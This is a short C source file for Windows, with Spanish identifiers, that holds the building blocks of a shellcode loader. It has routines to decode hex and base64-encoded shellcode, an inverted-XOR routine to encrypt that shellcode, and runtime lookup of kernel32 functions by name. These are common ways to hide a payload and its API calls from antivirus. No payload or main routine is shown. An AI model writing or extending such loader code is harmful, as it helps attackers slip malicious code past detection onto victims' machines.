#include <windows.h>
#include <tchar.h>
#include <wincrypt.h>

BOOL convertir_hex_a_bytes(CONST CHAR *hex, BYTE **bytes, DWORD *longitud) {
    DWORD hex_longitud = strlen(hex);
    if (hex_longitud % 2 != 0) return FALSE;

    *longitud = hex_longitud / 2;
    *bytes = (BYTE *)malloc(*longitud);
    if (*bytes == NULL) return FALSE;

    for (DWORD i = 0; i < *longitud; i++) {
        sscanf(hex + 2 * i, "%2hhx", &(*bytes)[i]);
    }

    return TRUE;
}

BOOL decodificar_base64(CONST CHAR *shellcode, BYTE **salida_byte, DWORD *salida_tam) {
    BOOL resultado = FALSE;
    DWORD longitud = 0;

    if (!CryptStringToBinaryA(shellcode, 0, CRYPT_STRING_BASE64, NULL, &longitud, NULL, NULL)) {
        return FALSE;
    }

    *salida_byte = (BYTE *)malloc(longitud);
    if (*salida_byte == NULL) {
        return FALSE;
    }

    if (CryptStringToBinaryA(shellcode, 0, CRYPT_STRING_BASE64, *salida_byte, &longitud, NULL, NULL)) {
        *salida_tam = longitud;
        resultado = TRUE;
    } else {
        free(*salida_byte);
        *salida_byte = NULL;
    }

    return resultado;
}

VOID NXOR(BYTE *shellcode, BYTE *clave, BYTE *shellcode_cifrada, DWORD longitud) {
    for (DWORD i = 0; i < longitud; i++) {
        shellcode_cifrada[i] = ~(shellcode[i] ^ clave[i % strlen((CONST CHAR*)clave)]);
    }
}

FARPROC construir_funcion(CONST CHAR* nombre_funcion) {
    HMODULE hModule = GetModuleHandleA("kernel32.dll");
    FARPROC funcion = GetProcAddress(hModule, nombre_funcion);
    return funcion;
}